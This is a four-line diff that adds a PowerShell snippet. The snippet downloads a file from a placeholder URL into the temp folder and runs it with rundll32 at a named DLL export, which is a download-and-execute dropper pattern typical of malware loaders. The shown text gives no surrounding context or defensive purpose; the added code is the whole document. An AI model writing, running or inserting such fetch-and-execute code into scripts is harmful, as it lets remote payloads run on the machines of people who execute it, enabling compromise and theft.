@@ -1,0 +1,4 @@
+$path = $Env:temp+'\tst3.bin'; 
+$client = New-Object System.Net.WebClient; 
+$client.downloadfile('https://urldll',$path);
+c:\windows\system32\rundll32.exe $path,ClearMyTracksByProcess 11985756;
